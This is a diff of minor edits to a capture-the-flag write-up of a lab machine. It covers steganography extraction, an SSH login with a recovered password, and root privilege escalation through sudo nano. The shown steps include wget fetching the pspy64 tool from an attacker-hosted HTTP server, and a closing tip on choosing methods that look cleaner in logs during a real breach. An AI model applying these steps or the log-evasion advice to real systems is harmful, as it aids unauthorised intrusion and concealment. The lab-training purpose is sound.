@@ -49,27 +49,27 @@ stegseek {file}
 
 It is simple, efficient and very beginner friendly.
 
-I pulled the image from the web page using `wget` and used `stegseek` to find the hidden strings:
+I pulled the image from the web page using `wget` and used `stegseek` to extract data embedded using steganography:
 
 <img width="941" height="132" alt="Screenshot 2026-09-13 175740" src="https://github.com/user-attachments/assets/3228c058-2d74-4207-878f-efb70a295622" />
 
 ##
 
-After using checking the output I stumbled across the password for a user named "holt".
+After checking the output I stumbled across the password for a user named "holt".
 
 <img width="425" height="158" alt="Screenshot 2026-09-13 175811" src="https://github.com/user-attachments/assets/abcd2fae-39e5-4aa4-b8f8-24011066f37a" />
 
 Since there was no log-in form on the web application I figured it must be related to either the ftp or the ssh services.
 
-I tested the ssh service first since I thought it will be easier to work with in order to get root access from the ssh and I was able to access Holt's account and find in his home directory the first flag
+I tested the ssh service first since I thought it would be easier to work with in order to get root access through ssh and I was able to access Holt's account and find in his home directory the first flag
 
 ---
 
 ## 4. Privilege Escalation: 🪜
 
-After accessing Holt's account, I used `sudo -l` to check for his privileges and found I have access to the `nano` command under root access.
+After accessing Holt's account, I used `sudo -l` to check for his privileges and found I have access to the `nano` command with root privileges.
 
-I thought there might be a process I can manipulate in order to gain access to root under a reverse shell so I used a python http server to upload the `pspy64` tool.
+I thought here might be a privileged process I could leverage in order to gain access to root under a reverse shell so I used a python http server to upload the `pspy64` tool.
 >- Attacker machine: python3 -m http.server 80
 >- Target machine: wget http://{AttackerIP}:80/pspy64
 >- Target machine: chmod +x pspy64
@@ -89,7 +89,7 @@ I was then able to check root's home directory and retrieve the flag from there 
 
 1. It is always important to look in the source code for low-hanging fruits.
 2. If there is an indication for the usage of steganography, a hacker needs to know how to check for the contents inside.
-3. In a real scenario I wouldn't give Holt root privileges since it's pointing easily to source of breach. It would be better to get a shell through nano for root since it affects less the entire machine and looks cleaner in the logs.
+3. In a real scenario I wouldn't give Holt root privileges since it's pointing easily to source of breach. It would be better to get a shell through nano for root since it affects less the entire machine and I think may look cleaner in the logs.
 
 ---
 
